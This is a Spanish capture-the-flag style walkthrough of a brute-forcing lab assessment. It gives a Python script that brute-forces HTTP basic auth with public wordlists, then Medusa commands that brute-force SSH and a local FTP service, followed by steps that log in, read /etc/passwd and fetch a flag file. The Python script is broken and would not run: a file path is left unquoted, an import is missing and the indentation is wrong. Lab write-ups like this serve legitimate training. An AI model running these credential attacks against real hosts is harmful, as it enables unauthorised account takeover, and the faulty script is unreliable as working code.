# Login Brute Forcing

## Skills Assessment Part 1

La primera parte consiste en realizar una fuerza bruta. Si se encuentra el nombre de usuario correcta, se obtiene el username para comenzar la segunda parte.

Las siguientes wordlists podrían ser útiles:

• SecLists/Usernames/top-usernames-shortlist.txt

• 2023-200\_most\_used\_passwords.txt

**Pregunta 1:** ¿Cuál es la contraseña para el inicio de sesión con autenticación básica?

**Pregunta 2**: Después de haber forzado con éxito el inicio de sesión, ¿cuál es el nombre de usuario que se le ha asignado para la siguiente parte de la evaluación de habilidades?

1. Comprobamos las wordlists que nos sugieren:
   1. Ruta para el archivo de usuarios: /opt/useful/seclists/Usernames/top-usernames-shortlist.txt
2. Generamos el siguiente archivo Python que atacará por fuerza bruta el basic auth login que nos aparece al entrar por el navegador a la IP del objetivo:

```
import requests

ip = "94.237.57.82" # Change this to your instance IP address
port = 51006 # Change this to your instance port number
users = /opt/useful/seclists/Usernames/top-usernames-shortlist.txt

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt").text.splitlines()

for user in users:
    for password in passwords:
        print(f"Probando: {user}:{password}")
    try:
        response = requests.get(
        f"http://{ip}:{port}/",
        auth=HTTPBasicAuth(user, password),
        timeout=10
        )
    if response.status_code == 200:
    print(f"\n[ÉXITO] Credenciales válidas: {user}:{password}")
    
    # Buscar el username para la parte 2 en el contenido HTML
    if "Welcome" in response.text:
        username = response.text.split("Welcome, ")[1].split("!")[0]
        print(f"Username para parte 2: {username}")
    else:
    
        print("Revisa manualmente la respuesta:", response.text[:200])
        exit()
        
    except Exception as e:
        print(f"Error: {str(e)}")
```

<figure><img src="../../../../.gitbook/assets/image (392).png" alt=""><figcaption></figcaption></figure>

3. Entramos con las credenciales admin:CONTRASEÑA en el navegador y nos aparece lo siguiente:

<figure><img src="../../../../.gitbook/assets/image (393).png" alt=""><figcaption></figcaption></figure>

## Skills Assessment Part 2

**Utilice el nombre de usuario que le dieron cuando completó la parte 1 de la evaluación de habilidades para forzar el inicio de sesión en la instancia de destino.**

**Target**(s): 83.136.255.244:30431

**Pregunta 1**: ¿Cuál es el nombre de usuario del usuario ftp que encuentras mediante fuerza bruta?

1. Comprobamos si medusa está instalado:

```
medusa -h
```

2. Como no lo está lo instalaremos:

```
sudo apt-get update -y && sudo apt-get upgrade -y
sudo apt-get -y install medusa
```

3. Con Medusa ahora haremos una fuerza bruta contra el servicio SSH del objetivo:

**Target**(s): 94.237.54.172:42415

```
medusa -h 94.237.54.172 -n 42415 -u satwossh -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

* Se encuentran varias credenciales con el usuario del último paso de la parte 1.

<figure><img src="../../../../.gitbook/assets/image (394).png" alt=""><figcaption></figcaption></figure>

4. Iniciamos sesión por ssh con las credenciales encontradas:

```
ssh USUARIO@94.237.54.172 -p 42415
contraseña
```

<figure><img src="../../../../.gitbook/assets/image (395).png" alt=""><figcaption></figcaption></figure>

5. Navegamos por los directorios, aunque no encontramos nada referente a otro usuario. Mostramos el contenido de _/etc/passwd_ y vemos el usuario que estábamos buscando:

<figure><img src="../../../../.gitbook/assets/image (396).png" alt=""><figcaption></figcaption></figure>

**Pregunta 2**: ¿Qué contiene el archivo flag.txt?

1. Utilizamos nmap sobre el localhost para descubrir los puertos abiertos en la máquina:

<figure><img src="../../../../.gitbook/assets/image (398).png" alt=""><figcaption></figcaption></figure>

2. Haremos un ataque de fuerza bruta desde dentro de la máquina al servicio ftp con el usuario descubierto, utilizaremos Medusa y el archivo passwords.txt que está dentro de la carpeta del usuario de la parte 1:

<figure><img src="../../../../.gitbook/assets/image (399).png" alt=""><figcaption></figcaption></figure>

```
medusa -h 127.0.0.1 -u USUARIO_DESCUBIERTO -P passwords.txt -M ftp -t 5
```

<figure><img src="../../../../.gitbook/assets/image (400).png" alt=""><figcaption></figcaption></figure>

3. Encontramos varias credenciales y las utilizamos para iniciar sesión al servicio ftp:

```
ftp localhost 
```

<figure><img src="../../../../.gitbook/assets/image (401).png" alt=""><figcaption></figcaption></figure>

4. Encontramos el archivo flag.txt, lo descargamos y lo leemos desde la máquina en el usuario SSH:

```
ls
get flag.txt
exit
cat flag.txt
```

<figure><img src="../../../../.gitbook/assets/image (402).png" alt=""><figcaption></figcaption></figure>
